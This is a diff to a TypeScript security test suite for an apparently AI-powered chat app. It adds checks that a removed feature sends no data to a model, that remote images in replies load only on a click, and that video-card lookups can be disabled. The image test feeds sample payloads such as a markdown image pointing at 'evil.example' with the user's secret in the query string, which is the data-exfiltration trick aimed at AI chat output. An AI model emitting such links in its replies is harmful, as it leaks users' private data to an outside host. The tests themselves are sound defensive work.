@@ -9,6 +9,7 @@
  * hold one names its length or its outcome instead.
  */
 import fs from "node:fs/promises"
+import { createServer } from "node:http"
 import os from "node:os"
 import path from "node:path"
 import WebSocket from "ws"
@@ -29,6 +30,9 @@ import { protectAppData } from "../src/server/tool/app-data"
 import { MASK, redactCommand, redactString } from "../src/shared/mcp-redact"
 import { scanMcpImports } from "../src/server/mcp-import"
 import { redactSecrets } from "../src/main/log-file"
+import { renderReply } from "../src/renderer/src/lib/markdown"
+import { linkOnlyCard } from "../src/shared/media-platform"
+import { enrichMedia } from "../src/renderer/src/lib/media-embed"
 
 type Section = (name: string) => void
 
@@ -72,6 +76,7 @@ export async function roundEightSecurityChecks(check: Check, section: Section): 
     await fileRequestChecks(check, section, root)
     await officeChannelChecks(check, section, root)
     await maskingChecks(check, section, root)
+    await egressChecks(check, section, root)
   } finally {
     await fs.rm(root, { recursive: true, force: true }).catch(() => undefined)
   }
@@ -503,6 +508,96 @@ async function maskingChecks(check: Check, section: Section, root: string): Prom
     check("nothing the window was sent holds a secret", seen.every((line) => leaks(line) === 0), seen.length)
   } finally {
     socket.close()
+    await backend.close()
+  }
+}
+
+// ---------------------------------------------------------- E3, E19, E11
+async function egressChecks(check: Check, section: Section, root: string): Promise<void> {
+  section("Round 8 (E3): the home screen sends nothing to a model")
+  {
+    const home = await fs.readFile(path.join(process.cwd(), "src/renderer/src/components/HomeHero.vue"), "utf8").catch(() => "")
+    const protocol = await fs.readFile(path.join(process.cwd(), "src/shared/protocol.ts"), "utf8").catch(() => "")
+    const serverFile = await fs.stat(path.join(process.cwd(), "src/server/home-suggest.ts")).then(() => true, () => false)
+    check("the home screen makes no suggestion request", !home.includes("home.suggest") && !/client\.request\(\{ type: "home\./.test(home))
+    check("the protocol has no such request", !protocol.includes('"home.suggest"'))
+    check("the server code that built it is gone", !serverFile)
+
+    // A model standing by, which must hear nothing when the backend is asked the old way.
+    const heard: string[] = []
+    const stub = createServer((request, response) => {
+      heard.push(request.url ?? "")
+      response.writeHead(200, { "content-type": "application/json" })
+      response.end(JSON.stringify({ data: [{ id: "stub-model" }] }))
+    })
+    await new Promise<void>((resolve) => stub.listen(0, "127.0.0.1", resolve))
+    const port = (stub.address() as { port: number }).port
+    const data = path.join(root, "e3-data")
+    const project = path.join(root, "e3-project")
+    await fs.mkdir(path.join(data, "storage"), { recursive: true })
+    await fs.mkdir(project, { recursive: true })
+    await fs.writeFile(path.join(project, "secret-plan.md"), "x")
+    await fs.writeFile(path.join(data, "storage", "config.json"), "{}")
+    const backend = await startBackend(data)
+    try {
+      await backend.runtime.config.set({
+        providerEndpoints: { lmstudio: `http://127.0.0.1:${port}/v1` },
+        model: { provider: "lmstudio", model: "stub-model" },
+      })
+      await handle(backend.runtime, { type: "provider.auth", provider: "lmstudio", apiKey: "local" } as unknown as Request).catch(() => undefined)
+      heard.length = 0
+      const answer = await handle(backend.runtime, { type: "home.suggest", directory: project, language: "en" } as unknown as Request).catch(() => undefined)
+      await new Promise((resolve) => setTimeout(resolve, 300))
+      check("asked the old way, the backend answers nothing", answer === undefined, answer)
+      check("...and no request reaches the model", heard.length === 0, heard)
+    } finally {
+      await backend.close()
+      stub.close()
+    }
+  }
+
+  section("Round 8 (E19): a web picture in a reply loads only on a click")
+  {
+    const options = { links: { imageTip: "Preview", remoteImage: "Click to load image" }, paths: { tip: "Open" } }
+    const html = (source: string) =>
+      renderReply(source, options)
+        .map((block) => (block.kind === "html" ? block.html : ""))
+        .join("\n")
+    const exfil = html("Done. ![](https://evil.example/pixel.png?d=the-users-secret)")
+    check("a web picture is not drawn as a picture", !/<img\b/i.test(exfil), exfil.slice(0, 120))
+    check("...but as a placeholder naming its host", /data-remote-src="https:\/\/evil\.example\/pixel\.png\?d=the-users-secret"/.test(exfil) && exfil.includes("evil.example</span>"))
+    const linked = html("[chart](https://evil.example/chart.png?d=x)")
+    check("a link to a picture waits too", !/<img\b/i.test(linked) && linked.includes("md-img-remote md-img-link"))
+    const protocolRelative = html("![x](//evil.example/p.png)")
+    check("a protocol-relative picture is never drawn", !/<img\b/i.test(protocolRelative))
+    check("an inline picture is drawn at once", /<img class="md-img" src="data:image\/png;base64,/.test(html("![dot](data:image/png;base64,iVBORw0KGgo=)")))
+    check("a picture on this machine is still a local card", /data-media-path="\/tmp\/shot\.png"/.test(html("![](/tmp/shot.png)")))
+    const svg = renderReply("```svg\n<svg><image href=\"https://evil.example/p.png\"/></svg>\n```", { ...options, diagrams: { streaming: false } })
+    // What a drawing may fetch is decided when it is drawn (svg-safe.ts), and mdcheck replays those cases.
+    check("a drawing is handed over as source, not as markup", svg.some((block) => block.kind === "diagram") && !svg.some((block) => block.kind === "html" && block.html.includes("evil.example")))
+    const textPart = await fs.readFile(path.join(process.cwd(), "src/renderer/src/components/parts/TextPart.vue"), "utf8").catch(() => "")
+    check("the reply view swaps a placeholder for its picture only on a click", /closest<HTMLElement>\("\[data-remote-src\]"\)[\s\S]{0,200}allowRemoteImage\(/.test(textPart))
+  }
+
+  section("Round 8 (E11): video card lookups can be switched off")
+  {
+    const link = "https://www.bilibili.com/video/BV1xx411c7mD"
+    const card = linkOnlyCard(link)
+    check("a card can be made from the link alone", card?.platform === "bilibili" && card.title === "" && card.coverUrl === "", card)
+    check("a link to no platform makes no card", linkOnlyCard("https://example.com/watch") === null)
+    // The window's own path, with no bridge to reach: switched off, it must not need one.
+    const cards = await enrichMedia([link, "https://www.youtube.com/watch?v=dQw4w9WgXcQ"], false).catch((err: unknown) => String(err))
+    check("switched off, the window draws the cards without asking the main process", Array.isArray(cards) && cards.length === 2 && cards.every((meta) => !meta.title && !meta.coverUrl), cards)
+    const main = await fs.readFile(path.join(process.cwd(), "src/main/media-embed.ts"), "utf8").catch(() => "")
+    const index = await fs.readFile(path.join(process.cwd(), "src/main/index.ts"), "utf8").catch(() => "")
+    check("the main process answers link-only cards when it is off", /if \(!detailsOn\(\)\) return list\.map\(linkOnlyCard\)/.test(main))
+    check("...and the cover proxy fetches nothing when it is off", /detailsOn\(\) \? serveCover\([\s\S]*?: new Response\(null, \{ status: 404 \}\)/.test(main))
+    check("the switch it reads is the setting, on unless turned off", /registerMediaEmbeds\(\(\) => backend\?\.runtime\.config\.get\(\)\.videoCardDetails !== false\)/.test(index))
+    const data = path.join(root, "e11-data")
+    await fs.mkdir(path.join(data, "storage"), { recursive: true })
+    await fs.writeFile(path.join(data, "storage", "config.json"), "{}")
+    const backend = await startBackend(data)
+    check("a new profile has the lookups on", backend.runtime.config.get().videoCardDetails !== false)
     await backend.close()
   }
 }
